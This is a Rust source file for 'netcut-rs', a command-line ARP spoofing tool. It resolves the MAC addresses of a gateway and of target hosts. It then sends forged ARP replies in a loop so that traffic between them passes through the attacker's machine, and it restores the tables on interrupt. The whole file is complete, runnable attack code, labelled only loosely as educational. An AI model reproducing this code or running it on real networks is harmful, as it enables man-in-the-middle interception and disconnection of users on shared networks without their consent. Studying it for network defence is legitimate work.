use anyhow::{anyhow, Result};
use clap::{Arg, Command};
use pnet::datalink::{self, Channel::Ethernet, NetworkInterface};
use pnet::packet::arp::{ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

#[derive(Debug)]
struct Target {
    ip: Ipv4Addr,
    mac: MacAddr,
}

struct ArpSpoofer {
    interface: NetworkInterface,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    targets: Vec<Target>,
    running: Arc<AtomicBool>,
}

impl ArpSpoofer {
    fn new(
        interface: NetworkInterface,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddr,
        targets: Vec<Target>,
    ) -> Self {
        Self {
            interface,
            gateway_ip,
            gateway_mac,
            targets,
            running: Arc::new(AtomicBool::new(true)),
        }
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn send_arp_packet(
        &self,
        sender_mac: MacAddr,
        sender_ip: Ipv4Addr,
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        is_reply: bool,
    ) -> Result<()> {
        let (mut tx, _) = match datalink::channel(&self.interface, Default::default()) {
            Ok(Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => return Err(anyhow!("Unsupported channel type")),
            Err(e) => return Err(anyhow!("Error creating channel: {}", e)),
        };

        // Create Ethernet frame
        let mut ethernet_buffer = [0u8; 42];
        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

        ethernet_packet.set_destination(target_mac);
        ethernet_packet.set_source(sender_mac);
        ethernet_packet.set_ethertype(EtherTypes::Arp);

        // Create ARP packet
        let mut arp_buffer = [0u8; 28];
        let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

        // Set ARP packet fields
        arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType(1)); // Ethernet = 1
        arp_packet.set_protocol_type(EtherTypes::Ipv4);
        arp_packet.set_hw_addr_len(6);
        arp_packet.set_proto_addr_len(4);
        arp_packet.set_operation(if is_reply { pnet::packet::arp::ArpOperation(2) } else { pnet::packet::arp::ArpOperation(1) }); // 1 = Request, 2 = Reply
        arp_packet.set_sender_hw_addr(sender_mac);
        arp_packet.set_sender_proto_addr(sender_ip);
        arp_packet.set_target_hw_addr(target_mac);
        arp_packet.set_target_proto_addr(target_ip);

        // Set ARP as payload of Ethernet frame
        ethernet_packet.set_payload(arp_packet.packet());

        // Send the packet
        if let Some(Err(e)) = tx.send_to(ethernet_packet.packet(), None) {
            return Err(anyhow!("Failed to send packet: {}", e));
        }
        Ok(())
    }

    fn poison_arp_tables(&self) -> Result<()> {
        while self.running.load(Ordering::SeqCst) {
            for target in &self.targets {
                // Tell target that gateway MAC is our MAC
                if let Err(e) = self.send_arp_packet(
                    self.interface.mac.unwrap(),
                    self.gateway_ip,
                    target.mac,
                    target.ip,
                    true, // Reply
                ) {
                    eprintln!("Error sending ARP to target: {}", e);
                }

                // Tell gateway that target MAC is our MAC
                if let Err(e) = self.send_arp_packet(
                    self.interface.mac.unwrap(),
                    target.ip,
                    self.gateway_mac,
                    self.gateway_ip,
                    true, // Reply
                ) {
                    eprintln!("Error sending ARP to gateway: {}", e);
                }

                println!(
                    "Poisoned ARP tables: {} ({}) thinks gateway is at {}",
                    target.ip,
                    target.mac,
                    self.interface.mac.unwrap()
                );
            }

            thread::sleep(Duration::from_secs(2));
        }
        Ok(())
    }

    fn restore_arp_tables(&self) -> Result<()> {
        for target in &self.targets {
            // Tell target the real gateway MAC
            if let Err(e) = self.send_arp_packet(
                self.gateway_mac,
                self.gateway_ip,
                target.mac,
                target.ip,
                true, // Reply
            ) {
                eprintln!("Error restoring ARP for target: {}", e);
            }

            // Tell gateway the real target MAC
            if let Err(e) = self.send_arp_packet(
                target.mac,
                target.ip,
                self.gateway_mac,
                self.gateway_ip,
                true, // Reply
            ) {
                eprintln!("Error restoring ARP for gateway: {}", e);
            }

            println!(
                "Restored ARP tables for {} ({})",
                target.ip, target.mac
            );
        }
        Ok(())
    }
}

fn get_mac_from_ip(interface: &NetworkInterface, ip: Ipv4Addr) -> Result<MacAddr> {
    let (mut tx, mut rx) = match datalink::channel(interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => return Err(anyhow!("Unsupported channel type")),
        Err(e) => return Err(anyhow!("Error creating channel: {}", e)),
    };

    // Send ARP request
    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(interface.mac.unwrap());
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();

    // Set ARP request fields
    arp_packet.set_hardware_type(pnet::packet::arp::ArpHardwareType(1)); // Ethernet = 1
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(pnet::packet::arp::ArpOperation(1)); // Request = 1
    arp_packet.set_sender_hw_addr(interface.mac.unwrap());
    arp_packet.set_sender_proto_addr(Ipv4Addr::new(0, 0, 0, 0)); // We don't know our IP
    arp_packet.set_target_hw_addr(MacAddr::zero());
    arp_packet.set_target_proto_addr(ip);

    ethernet_packet.set_payload(arp_packet.packet());
    
    // Send the ARP request
    if let Some(Err(e)) = tx.send_to(ethernet_packet.packet(), None) {
        return Err(anyhow!("Failed to send ARP request: {}", e));
    }

    // Wait for ARP response
    for _ in 0..10 {
        match rx.next() {
            Ok(packet) => {
                let ethernet = EthernetPacket::new(packet).unwrap();
                if ethernet.get_ethertype() == EtherTypes::Arp {
                    let arp = ArpPacket::new(ethernet.payload()).unwrap();
                    if arp.get_operation() == pnet::packet::arp::ArpOperation(2) // Reply = 2
                        && arp.get_sender_proto_addr() == ip
                    {
                        return Ok(arp.get_sender_hw_addr());
                    }
                }
            }
            Err(e) => eprintln!("Error receiving packet: {}", e),
        }
        thread::sleep(Duration::from_millis(100));
    }

    Err(anyhow!("Could not resolve MAC address for {}", ip))
}

fn get_interface(name: &str) -> Result<NetworkInterface> {
    let interfaces = datalink::interfaces();
    interfaces
        .into_iter()
        .find(|iface| iface.name == name)
        .ok_or_else(|| anyhow!("Interface {} not found", name))
}

fn main() -> Result<()> {
    let matches = Command::new("netcut-rs")
        .version("0.1.0")
        .about("ARP spoofing tool for educational purposes")
        .arg(
            Arg::new("interface")
                .short('i')
                .long("interface")
                .value_name("INTERFACE")
                .help("Network interface to use")
                .required(true),
        )
        .arg(
            Arg::new("gateway")
                .short('g')
                .long("gateway")
                .value_name("IP")
                .help("Gateway IP address")
                .required(true),
        )
        .arg(
            Arg::new("targets")
                .short('t')
                .long("targets")
                .value_name("IPs")
                .help("Target IP addresses (comma separated)")
                .required(true),
        )
        .get_matches();

    let interface_name = matches.get_one::<String>("interface").unwrap();
    let gateway_ip_str = matches.get_one::<String>("gateway").unwrap();
    let targets_str = matches.get_one::<String>("targets").unwrap();

    let gateway_ip: Ipv4Addr = gateway_ip_str.parse()?;
    let target_ips: Vec<Ipv4Addr> = targets_str
        .split(',')
        .map(|s| s.trim().parse().unwrap())
        .collect();

    let interface = get_interface(interface_name)?;
    println!("Using interface: {}", interface.name);

    // Get gateway MAC
    let gateway_mac = get_mac_from_ip(&interface, gateway_ip)?;
    println!("Gateway {} has MAC: {}", gateway_ip, gateway_mac);

    // Get target MAC addresses
    let mut targets = Vec::new();
    for target_ip in target_ips {
        let target_mac = get_mac_from_ip(&interface, target_ip)?;
        println!("Target {} has MAC: {}", target_ip, target_mac);
        targets.push(Target {
            ip: target_ip,
            mac: target_mac,
        });
    }

    let spoofer = ArpSpoofer::new(interface, gateway_ip, gateway_mac, targets);
    let running = spoofer.running.clone();

    // Handle Ctrl+C
    ctrlc::set_handler(move || {
        println!("\nReceived interrupt signal, restoring ARP tables...");
        running.store(false, Ordering::SeqCst);
    })
    .expect("Error setting Ctrl-C handler");

    println!("Starting ARP spoofing attack. Press Ctrl+C to stop and restore.");

    if let Err(e) = spoofer.poison_arp_tables() {
        eprintln!("Error during ARP spoofing: {}", e);
    }

    println!("Restoring ARP tables...");
    spoofer.restore_arp_tables()?;
    println!("Cleanup complete.");

    Ok(())
}